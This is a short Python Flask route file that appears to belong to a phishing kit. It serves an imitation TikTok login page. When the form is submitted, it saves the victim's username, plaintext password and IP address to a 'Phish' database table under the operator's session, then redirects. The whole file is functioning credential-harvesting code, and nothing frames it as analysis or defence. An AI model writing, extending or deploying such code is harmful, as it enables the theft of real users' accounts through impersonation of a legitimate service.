from app import db, app
from flask import render_template, request, session, redirect

from app.main.config.models import Phish

@app.route('/tiktok/login', methods=['GET', 'POST'])
def tt_login():
    if request.method == 'GET':
        return render_template('tiktok/tt_login.html')
    elif request.method == 'POST':
        data = request.form.to_dict()
        user_phished = Phish(platform='Tiktok',
                             owner=session["curr"],
                             phised_user=data["username"],
                             phished_pword=data["password"],
                             ip=request.remote_addr)
        db.session.add(user_phished)
        db.session.commit()
        return redirect('/homepage')
    '''
        platform = db.Column(db.String)
    phised_user = db.Column(db.String)
    phished_pword = db.Column(db.String)
    ip = db.Column(db.String)
    '''
    